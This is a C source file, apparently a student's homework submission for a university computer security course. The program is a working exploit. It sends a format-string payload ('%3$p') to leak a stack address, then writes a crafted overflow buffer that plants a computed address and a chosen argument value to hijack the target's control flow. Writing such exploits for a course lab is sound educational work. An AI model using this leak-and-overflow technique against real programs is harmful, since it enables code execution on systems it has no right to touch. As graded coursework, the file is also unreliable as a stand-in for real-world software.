/*
 * CMSC 414
 * Spring 2022 
 * Homework 1 | task1
 *
 * Build instructions:
 *   We will be building this with the Makefile provided; you may not make
 *   any changes to the Makefile.  You can #include any other standard C
 *   libraries you want in this file, but none that require any compiler
 *   flags that aren't already in the Makefile.
 *
 * Submission instructions:
 *   Submit this file.
 */

#include <unistd.h>
#include <stdio.h>  // for fwrite()
#include <string.h> // for memset()
#include <stdlib.h> // for EXIT_SUCCESS

#include <stdint.h>

#define BUFFER_SIZE 64

int main()
{

    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);  // Initialized to all zeroes

    fprintf(stderr, "send debug statements to stderr\n");

    /* you may change this string */
    char greeting[128] = "%3$p\n";

    write(STDOUT_FILENO, greeting, sizeof(greeting)-1);

    /* you may do whatever you want with the response */
    char response[512];
    fgets(response, sizeof(response), stdin);

    int senseAddr = (int)strtol(response, NULL, 0) - 0xb2;
    int realArg = 0x54455250;

    sprintf(buffer, "0000111122223333444455556666777788889999aaaabbbb");

    buffer[28] = (senseAddr >> 0) & 0xff;
    buffer[29] = (senseAddr >> 8) & 0xff;
    buffer[30] = (senseAddr >> 16) & 0xff;
    buffer[31] = (senseAddr >> 24) & 0xff;

    buffer[40] = (realArg >> 0) & 0xff;
    buffer[41] = (realArg >> 8) & 0xff;
    buffer[42] = (realArg >> 16) & 0xff;
    buffer[43] = (realArg >> 24) & 0xff;
    

    //TODO: Populate the buffer here, as you see fit
    write(STDOUT_FILENO, buffer, BUFFER_SIZE);

    return EXIT_SUCCESS;
}
